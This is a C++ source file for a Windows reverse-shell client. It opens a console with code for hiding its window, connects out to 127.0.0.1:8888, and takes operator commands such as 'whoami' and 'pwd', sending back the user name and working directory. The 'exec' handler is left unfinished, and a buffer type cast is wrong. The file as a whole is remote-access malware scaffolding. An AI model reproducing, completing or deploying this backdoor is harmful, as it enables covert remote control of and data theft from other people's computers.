#include<WinSock2.h>
#include<Windows.h>
#include<WS2tcpip.h>
#include<iostream>

#pragma comment(lib, "ws2_32.lib")
#define DEFAULT_BUFFLEN 1024
#pragma warning(disable:4996)

void RevShell();

int main() {
	HWND stealth; // Declare windows handle 
	AllocConsole(); // Allocates a new console for the calling process.
	/*A process can be associated with only one console,
	so the AllocConsole function fails if the calling process already has a console.
	A process can use the FreeConsole function to detach itself from its current console,
	then it can call AllocConsole to create a new console or AttachConsole to attach to another console.*/
	stealth = FindWindowA("ConsoleWindowClass", NULL); // Find the previous Window handler and hide/show the window depending upon the next command
	ShowWindow(stealth, SW_SHOWNORMAL); // Set show or hide windows console SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console

	RevShell();

	return 0;

}

void RevShell() {
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	SOCKET tcpSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	SOCKADDR_IN sock_addr;
	sock_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	sock_addr.sin_family = AF_INET;
	sock_addr.sin_port = htons(8888);

	if (connect(tcpSock, (SOCKADDR*)&sock_addr, sizeof(sock_addr)) == SOCKET_ERROR) {
		std::cout << "Get error " << WSAGetLastError();
		closesocket(tcpSock);
		WSACleanup();
		exit(0);
	}
	else {
		std::cout << "You are connected! Wait for command!..." << std::endl;
		
		char CommandReceive[DEFAULT_BUFFLEN] = "";
		while (true) {
			int Result = recv(tcpSock, CommandReceive, DEFAULT_BUFFLEN, 0);
			if (Result <= 0) {
				std::cout << "Cannot receive data\n";
				break;
			}
			else {
				if (strcmp(CommandReceive, "whoami") == 0) {
					std::cout << "Command whoami\n";
					// Execute whoami
					char UserName[257] = "";
					DWORD returnSize = 257;
					GetUserNameA(UserName, &returnSize);
					send(tcpSock, UserName, strlen(UserName) + 1, 0);
					memset(UserName, 0, sizeof(UserName));

				}
				else if (strcmp(CommandReceive, "pwd") == 0) {
					std::cout << "Command pwd\n";
					// Execute pwd
					char CurrentDirectory[MAX_PATH] = "";
					GetCurrentDirectory(MAX_PATH, (LPWSTR)CurrentDirectory);
					send(tcpSock, CurrentDirectory, MAX_PATH, 0);
					memset(CurrentDirectory, 0, sizeof(CurrentDirectory));

				}
				else if (strncmp(CommandReceive, "exec", 4) == 0){
					std::cout << "Command exec\n";
					// Execute cd
					char CommandExec[DEFAULT_BUFFLEN] = "";
					int j = 0;
					for (int i = 5; i < (*(&CommandReceive + 1) - CommandReceive); i++) {
						CommandExec[j] = CommandReceive[i];
						j++;
					}
					char buffer[1024] = "";
					

				}
				else if (strcmp(CommandReceive, "exit") == 0) {
					std::cout << "Command ext\n";
					std::cout << "Connection close\n";
					break;
					// Execute exit
				}
				else {
					std::cout << "Command not found: " << CommandReceive << std::endl;
				}

			}
			memset(CommandReceive, 0, sizeof(CommandReceive));
		}

	}

	closesocket(tcpSock);
	WSACleanup();

}